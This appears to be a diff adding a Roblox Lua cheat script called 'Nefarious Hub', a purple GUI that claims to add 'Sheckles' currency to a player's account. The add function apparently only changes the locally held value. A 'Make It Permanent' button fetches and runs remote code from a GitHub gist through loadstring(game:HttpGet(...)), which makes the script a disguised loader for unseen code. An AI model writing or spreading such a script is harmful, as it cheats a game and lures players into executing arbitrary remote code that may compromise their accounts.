@@ -1,0 +1,132 @@
+local P=game:GetService("Players")local U=game:GetService("UserInputService")local T=game:GetService("TweenService")local p=P.LocalPlayer
+local function LS()local g=Instance.new("ScreenGui")g.Name="NefariousLoadingUI"g.Parent=p:WaitForChild("PlayerGui")g.ResetOnSpawn=false g.IgnoreGuiInset=true
+local b=Instance.new("Frame",g)b.Size=UDim2.new(1,0,1,0)b.BackgroundColor3=Color3.fromRGB(32,4,46)b.BackgroundTransparency=0.22
+local m=Instance.new("Frame",b)m.Size=UDim2.new(0,410,0,170)m.Position=UDim2.new(0.5,-205,0.5,-85)m.BackgroundColor3=Color3.fromRGB(24,0,32)m.BorderSizePixel=0 m.BackgroundTransparency=0.04
+Instance.new("UICorner",m).CornerRadius=UDim.new(0,22)
+local ic=Instance.new("ImageLabel",m)ic.Size=UDim2.new(0,40,0,40)ic.Position=UDim2.new(0,24,0,24)ic.BackgroundTransparency=1 ic.Image="rbxassetid://123388888131057"
+Instance.new("UICorner",ic).CornerRadius=UDim.new(1,0)
+local tl=Instance.new("TextLabel",m)tl.Position=UDim2.new(0,74,0,28)tl.Size=UDim2.new(1,-90,0,34)tl.BackgroundTransparency=1 tl.Text="NEFARIOUS SCRIPT"tl.TextXAlignment=Enum.TextXAlignment.Left tl.Font=Enum.Font.GothamBold tl.TextSize=28 tl.TextColor3=Color3.fromRGB(255,255,255)tl.TextStrokeTransparency=0.7
+local bb=Instance.new("Frame",m)bb.Size=UDim2.new(0.87,0,0,32)bb.Position=UDim2.new(0.065,0,0,80)bb.BackgroundColor3=Color3.fromRGB(38,38,60)bb.BorderSizePixel=0
+Instance.new("UICorner",bb).CornerRadius=UDim.new(0,15)
+local bar=Instance.new("Frame",bb)bar.Size=UDim2.new(0,0,1,0)bar.BackgroundColor3=Color3.fromRGB(128,56,255)bar.BorderSizePixel=0
+Instance.new("UICorner",bar).CornerRadius=UDim.new(0,15)
+local lt=Instance.new("TextLabel",m)lt.Position=UDim2.new(0.065,0,0,122)lt.Size=UDim2.new(0.87,0,0,22)lt.BackgroundTransparency=1 lt.Font=Enum.Font.GothamBold lt.TextSize=18 lt.TextColor3=Color3.fromRGB(180,130,255)lt.TextStrokeTransparency=0.7 lt.TextXAlignment=Enum.TextXAlignment.Left
+local st=Instance.new("TextLabel",m)st.Position=UDim2.new(0.065,0,1,-26)st.Size=UDim2.new(0.87,0,0,20)st.BackgroundTransparency=1 st.Text="Subscribe To NefariousScript"st.TextXAlignment=Enum.TextXAlignment.Left st.Font=Enum.Font.GothamBold st.TextSize=16 st.TextColor3=Color3.fromRGB(255,255,255)st.TextStrokeTransparency=0.7
+for i=1,50 do T:Create(bar,TweenInfo.new(0.15,Enum.EasingStyle.Quad),{Size=UDim2.new(i/50,0,1,0)}):Play()lt.Text="Loading"..string.rep(".",(i%4))wait(8/50)end
+lt.Text="Loaded!"
+local function fade(r,d)for _,o in ipairs(r:GetDescendants())do if o:IsA("GuiObject")then if o:IsA("TextLabel")or o:IsA("TextButton")or o:IsA("TextBox")then T:Create(o,TweenInfo.new(d),{TextTransparency=1}):Play()end if o:IsA("ImageLabel")or o:IsA("ImageButton")then T:Create(o,TweenInfo.new(d),{ImageTransparency=1}):Play()end T:Create(o,TweenInfo.new(d),{BackgroundTransparency=1}):Play()end end end
+wait(0.6)fade(g,0.7)wait(0.75)g:Destroy()end
+LS()
+local ch=p.Character or p.CharacterAdded:Wait()
+local hr=ch:WaitForChild("HumanoidRootPart")
+local ls=p:WaitForChild("leaderstats")
+local SK=ls:WaitForChild("Sheckles")
+local PV=game.ReplicatedStorage:WaitForChild("Assets"):WaitForChild("PopVFX")
+local PF=game.ReplicatedStorage:WaitForChild("Assets"):WaitForChild("Poof")
+local TP=game.Workspace:WaitForChild("Temporary")
+local function sPop(pos)task.spawn(function()local mo=Instance.new("Model")mo.Parent=TP
+local v=PV:Clone()v.Parent=mo mo:ScaleTo(0.5)v.Position=pos
+task.wait()for _,x in pairs(v:GetDescendants())do if x:IsA("ParticleEmitter")then x:Emit(x:GetAttribute("EmitCount")or 10)end end
+game.Debris:AddItem(mo,3)end)end
+local function sPoof(pos)task.spawn(function()local v=PF:Clone()v.Parent=TP v.Position=pos
+task.wait()for _,x in pairs(v:GetDescendants())do if x:IsA("ParticleEmitter")then x:Emit(math.random(7,11))end end
+game.Debris:AddItem(v,3)end)end
+local function burst(n)local base=hr.Position
+for i=1,n do local off=Vector3.new(math.random(-4,4),math.random(0,3),math.random(-4,4))task.delay(i*0.08,function()sPop(base+off)end)end
+sPoof(base+Vector3.new(0,1,0))end
+local gui=Instance.new("ScreenGui")gui.Name="NefariousHubGUI"gui.ResetOnSpawn=false gui.Parent=p:WaitForChild("PlayerGui")
+local main=Instance.new("Frame",gui)main.Size=UDim2.new(0,340,0,318)main.Position=UDim2.new(0.5,-170,0.5,-159)main.BackgroundColor3=Color3.fromRGB(28,10,38)main.BorderSizePixel=0 main.Active=true
+Instance.new("UICorner",main).CornerRadius=UDim.new(0,18)main.BackgroundTransparency=0.04
+local mg=Instance.new("UIStroke",main)mg.Thickness=2 mg.Color=Color3.fromRGB(150,0,255)mg.Transparency=0.17
+local gr=Instance.new("UIGradient",main)gr.Color=ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(50,0,80)),ColorSequenceKeypoint.new(1,Color3.fromRGB(10,0,18))}gr.Rotation=90
+local tb=Instance.new("Frame",main)tb.Size=UDim2.new(1,0,0,42)tb.BackgroundColor3=Color3.fromRGB(34,8,48)tb.BorderSizePixel=0 tb.Active=true
+Instance.new("UICorner",tb).CornerRadius=UDim.new(0,16)
+local tp2=Instance.new("Frame",tb)tp2.Size=UDim2.new(1,0,0.5,0)tp2.Position=UDim2.new(0,0,0.5,0)tp2.BackgroundColor3=Color3.fromRGB(34,8,48)tp2.BorderSizePixel=0
+local ttl=Instance.new("TextLabel",tb)ttl.Size=UDim2.new(1,-48,1,0)ttl.Position=UDim2.new(0,18,0,0)ttl.BackgroundTransparency=1 ttl.Text="Nefarious Hub"ttl.TextColor3=Color3.fromRGB(200,100,255)ttl.Font=Enum.Font.FredokaOne ttl.TextSize=27 ttl.TextXAlignment=Enum.TextXAlignment.Left ttl.TextStrokeTransparency=0.7 ttl.ClipsDescendants=true
+local mb=Instance.new("TextButton",tb)mb.Size=UDim2.new(0,28,0,28)mb.Position=UDim2.new(1,-34,0,7)mb.BackgroundColor3=Color3.fromRGB(55,0,90)mb.Text=""mb.AutoButtonColor=true
+Instance.new("UICorner",mb).CornerRadius=UDim.new(1,0)
+local ms=Instance.new("UIStroke",mb)ms.Color=Color3.fromRGB(220,120,255)ms.Thickness=1 ms.Transparency=0.13
+local ic2=Instance.new("Frame",mb)ic2.BackgroundTransparency=1 ic2.Size=UDim2.new(1,0,1,0)
+for i=1,3 do local br=Instance.new("Frame",ic2)br.Size=UDim2.new(0.7,0,0,3)br.Position=UDim2.new(0.15,0,0,6+(i-1)*7)br.BackgroundColor3=Color3.fromRGB(220,120,255)br.BackgroundTransparency=(i==2)and 0 or 0.45 br.BorderSizePixel=0
+Instance.new("UICorner",br).CornerRadius=UDim.new(0,2)end
+mb.MouseEnter:Connect(function()T:Create(mb,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(90,0,155)}):Play()for _,br in ipairs(ic2:GetChildren())do if br:IsA("Frame")then T:Create(br,TweenInfo.new(0.14),{BackgroundColor3=Color3.fromRGB(255,130,255)}):Play()end end end)
+mb.MouseLeave:Connect(function()T:Create(mb,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(55,0,90)}):Play()for _,br in ipairs(ic2:GetChildren())do if br:IsA("Frame")then T:Create(br,TweenInfo.new(0.14),{BackgroundColor3=Color3.fromRGB(220,120,255)}):Play()end end end)
+local ct=Instance.new("Frame",main)ct.Size=UDim2.new(1,0,1,-46)ct.Position=UDim2.new(0,0,0,44)ct.BackgroundTransparency=1
+local sl=Instance.new("TextLabel",ct)sl.Size=UDim2.new(1,-24,0,20)sl.Position=UDim2.new(0,12,0,8)sl.BackgroundTransparency=1 sl.Text="SHECKLES ADDER"sl.TextColor3=Color3.fromRGB(180,80,255)sl.Font=Enum.Font.GothamBold sl.TextSize=11 sl.TextXAlignment=Enum.TextXAlignment.Left
+local dv=Instance.new("Frame",ct)dv.Size=UDim2.new(1,-24,0,1)dv.Position=UDim2.new(0,12,0,30)dv.BackgroundColor3=Color3.fromRGB(100,0,180)dv.BackgroundTransparency=0.5 dv.BorderSizePixel=0
+local bb2=Instance.new("Frame",ct)bb2.Size=UDim2.new(1,-24,0,52)bb2.Position=UDim2.new(0,12,0,38)bb2.BackgroundColor3=Color3.fromRGB(15,0,25)bb2.BorderSizePixel=0
+Instance.new("UICorner",bb2).CornerRadius=UDim.new(0,10)
+local bs=Instance.new("UIStroke",bb2)bs.Color=Color3.fromRGB(100,0,180)bs.Thickness=1.5
+local btl=Instance.new("TextLabel",bb2)btl.Size=UDim2.new(1,0,0,20)btl.Position=UDim2.new(0,10,0,5)btl.BackgroundTransparency=1 btl.Text="CURRENT SHECKLES"btl.TextColor3=Color3.fromRGB(140,80,200)btl.Font=Enum.Font.GothamBold btl.TextSize=10 btl.TextXAlignment=Enum.TextXAlignment.Left
+local bv=Instance.new("TextLabel",bb2)bv.Size=UDim2.new(1,-10,0,26)bv.Position=UDim2.new(0,10,0,22)bv.BackgroundTransparency=1 bv.Text="¢"..tostring(SK.Value)bv.TextColor3=Color3.fromRGB(200,100,255)bv.Font=Enum.Font.GothamBold bv.TextSize=20 bv.TextXAlignment=Enum.TextXAlignment.Left
+SK.Changed:Connect(function(v)bv.Text="¢"..tostring(v)T:Create(bv,TweenInfo.new(0.15),{TextColor3=Color3.fromRGB(255,255,255)}):Play()task.delay(0.3,function()T:Create(bv,TweenInfo.new(0.25),{TextColor3=Color3.fromRGB(200,100,255)}):Play()end)end)
+local ib=Instance.new("Frame",ct)ib.Size=UDim2.new(1,-24,0,36)ib.Position=UDim2.new(0,12,0,98)ib.BackgroundColor3=Color3.fromRGB(15,0,25)ib.BorderSizePixel=0
+Instance.new("UICorner",ib).CornerRadius=UDim.new(0,10)
+local is=Instance.new("UIStroke",ib)is.Color=Color3.fromRGB(100,0,180)is.Thickness=1.5
+local txb=Instance.new("TextBox",ib)txb.Size=UDim2.new(1,-16,1,0)txb.Position=UDim2.new(0,8,0,0)txb.BackgroundTransparency=1 txb.PlaceholderText="Enter amount..."txb.PlaceholderColor3=Color3.fromRGB(90,50,130)txb.Text=""txb.TextColor3=Color3.fromRGB(220,160,255)txb.TextSize=14 txb.Font=Enum.Font.Gotham txb.ClearTextOnFocus=false
+txb.Focused:Connect(function()T:Create(is,TweenInfo.new(0.2),{Color=Color3.fromRGB(200,100,255)}):Play()end)
+txb.FocusLost:Connect(function()T:Create(is,TweenInfo.new(0.2),{Color=Color3.fromRGB(100,0,180)}):Play()end)
+local ab=Instance.new("TextButton",ct)ab.Size=UDim2.new(1,-24,0,36)ab.Position=UDim2.new(0,12,0,142)ab.BackgroundColor3=Color3.fromRGB(90,0,150)ab.Text="+ ADD SHECKLES"ab.TextColor3=Color3.fromRGB(255,255,255)ab.TextSize=14 ab.Font=Enum.Font.GothamBold ab.BorderSizePixel=0
+Instance.new("UICorner",ab).CornerRadius=UDim.new(0,10)
+local as2=Instance.new("UIStroke",ab)as2.Color=Color3.fromRGB(180,60,255)as2.Thickness=2
+ab.MouseEnter:Connect(function()T:Create(ab,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(120,0,200)}):Play()end)
+ab.MouseLeave:Connect(function()T:Create(ab,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(90,0,150)}):Play()end)
+local qa={100,500,1000,5000}
+local qr=Instance.new("Frame",ct)qr.Size=UDim2.new(1,-24,0,30)qr.Position=UDim2.new(0,12,0,186)qr.BackgroundTransparency=1
+local ql=Instance.new("UIListLayout",qr)ql.FillDirection=Enum.FillDirection.Horizontal ql.Padding=UDim.new(0,6)
+for _,amt in ipairs(qa)do local qb=Instance.new("TextButton",qr)qb.Size=UDim2.new(0.25,-5,1,0)qb.BackgroundColor3=Color3.fromRGB(40,5,60)qb.Text=amt>=1000 and(amt/1000).."K¢"or amt.."¢"qb.TextColor3=Color3.fromRGB(255,255,255)qb.TextSize=11 qb.Font=Enum.Font.GothamBold qb.BorderSizePixel=0
+Instance.new("UICorner",qb).CornerRadius=UDim.new(0,8)
+local qs=Instance.new("UIStroke",qb)qs.Color=Color3.fromRGB(120,0,200)qs.Thickness=1.5
+qb.MouseButton1Click:Connect(function()txb.Text=tostring(amt)end)
+qb.MouseEnter:Connect(function()T:Create(qb,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(70,0,110)}):Play()end)
+qb.MouseLeave:Connect(function()T:Create(qb,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(40,5,60)}):Play()end)end
+local pmb=Instance.new("TextButton",ct)pmb.Size=UDim2.new(1,-24,0,36)pmb.Position=UDim2.new(0,12,0,224)pmb.BackgroundColor3=Color3.fromRGB(90,0,150)pmb.Text="✦  Make It Permanent"pmb.TextColor3=Color3.fromRGB(255,255,255)pmb.TextSize=14 pmb.Font=Enum.Font.GothamBold pmb.BorderSizePixel=0
+Instance.new("UICorner",pmb).CornerRadius=UDim.new(0,10)
+local pmbs=Instance.new("UIStroke",pmb)pmbs.Color=Color3.fromRGB(180,60,255)pmbs.Thickness=2
+pmb.MouseEnter:Connect(function()T:Create(pmb,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(120,0,200)}):Play()end)
+pmb.MouseLeave:Connect(function()T:Create(pmb,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(90,0,150)}):Play()end)
+pmb.MouseButton1Click:Connect(function()
+T:Create(pmb,TweenInfo.new(0.08),{BackgroundColor3=Color3.fromRGB(160,60,255)}):Play()
+task.delay(0.18,function()T:Create(pmb,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(90,0,150)}):Play()end)
+loadstring(game:HttpGet("https://gist.githubusercontent.com/NefariousScript/a2faca2602d25b24a377aa2c86898c1b/raw/new%2520redirecting%2520gui"))()
+end)
+local stl=Instance.new("TextLabel",ct)stl.Size=UDim2.new(1,-24,0,20)stl.Position=UDim2.new(0,12,0,268)stl.BackgroundTransparency=1 stl.Text="Enter an amount and press Add"stl.TextColor3=Color3.fromRGB(120,80,160)stl.TextSize=11 stl.Font=Enum.Font.Gotham stl.TextXAlignment=Enum.TextXAlignment.Center
+local cr=Instance.new("TextLabel",ct)cr.Size=UDim2.new(1,0,0,20)cr.Position=UDim2.new(0,0,1,-22)cr.BackgroundTransparency=1 cr.Text="made by NefariousScript"cr.TextColor3=Color3.fromRGB(140,190,255)cr.Font=Enum.Font.Gotham cr.TextSize=13 cr.TextXAlignment=Enum.TextXAlignment.Center
+local function setSt(msg,col)stl.Text=msg stl.TextColor3=col or Color3.fromRGB(120,80,160)end
+local function shake()local o=main.Position
+for i=1,6 do task.wait(0.04)main.Position=o+UDim2.new(0,math.random(-5,5),0,0)end main.Position=o end
+local function addSK()local amt=tonumber(txb.Text:match("^%s*(.-)%s*$"))
+if not amt or amt<=0 or amt~=math.floor(amt)then setSt("⚠  Enter a valid whole number!",Color3.fromRGB(220,60,255))task.spawn(shake)return end
+if amt>1e9 then setSt("⚠  Max is 1,000,000,000!",Color3.fromRGB(220,60,255))return end
+SK.Value=SK.Value+amt burst(math.min(math.ceil(amt/500),8))
+T:Create(ab,TweenInfo.new(0.1),{BackgroundColor3=Color3.fromRGB(160,60,255)}):Play()
+task.delay(0.25,function()T:Create(ab,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(90,0,150)}):Play()end)
+local d=amt>=1000 and(math.floor(amt/100)/10).."K"or tostring(amt)
+setSt("✅ Added ¢"..d.." Sheckles!",Color3.fromRGB(180,80,255))txb.Text=""
+task.delay(3,function()setSt("Enter an amount and press Add")end)end
+ab.MouseButton1Click:Connect(addSK)
+txb.FocusLost:Connect(function(e)if e then addSK()end end)
+local minimized=false
+local nS=UDim2.new(0,340,0,318)local mS=UDim2.new(0,136,0,42)
+local nP=main.Position local mP=UDim2.new(nP.X.Scale,nP.X.Offset+204,nP.Y.Scale,nP.Y.Offset)
+local function doMin()minimized=true
+T:Create(main,TweenInfo.new(0.18,Enum.EasingStyle.Quad),{Size=mS,Position=mP}):Play()
+T:Create(ttl,TweenInfo.new(0.18),{TextSize=14}):Play()
+for _,v in pairs(ct:GetChildren())do if v:IsA("GuiObject")then T:Create(v,TweenInfo.new(0.11),{BackgroundTransparency=1}):Play()end end
+wait(0.15)ct.Visible=false
+for i,br in ipairs(ic2:GetChildren())do if br:IsA("Frame")then if i==2 then br.Rotation=90 else br.Visible=false end end end end
+local function doRes()minimized=false ct.Visible=true
+T:Create(main,TweenInfo.new(0.23,Enum.EasingStyle.Quad),{Size=nS,Position=nP}):Play()
+T:Create(ttl,TweenInfo.new(0.18),{TextSize=27}):Play()
+for _,v in pairs(ct:GetChildren())do if v:IsA("GuiObject")then T:Create(v,TweenInfo.new(0.18),{BackgroundTransparency=1}):Play()end end
+for _,br in ipairs(ic2:GetChildren())do if br:IsA("Frame")then br.Rotation=0 br.Visible=true end end end
+mb.MouseButton1Click:Connect(function()if not minimized then doMin()else doRes()end end)
+U.InputBegan:Connect(function(i,g)if not g and i.KeyCode==Enum.KeyCode.RightControl then gui.Enabled=not gui.Enabled end end)
+p.CharacterAdded:Connect(function(nc)ch=nc hr=nc:WaitForChild("HumanoidRootPart")if gui and gui.Parent then gui:Destroy()end end)
+local dg,di,ds,dp
+local function uDrag(i)local d=i.Position-ds main.Position=UDim2.new(main.Position.X.Scale,dp.X.Offset+d.X,main.Position.Y.Scale,dp.Y.Offset+d.Y)end
+local function bDrag(i)dg=true ds=i.Position dp=main.Position
+i.Changed:Connect(function()if i.UserInputState==Enum.UserInputState.End then dg=false end end)end
+tb.InputBegan:Connect(function(i)if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then bDrag(i)end end)
+tb.InputChanged:Connect(function(i)if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then di=i end end)
+U.InputChanged:Connect(function(i)if dg and i==di then uDrag(i)end end)
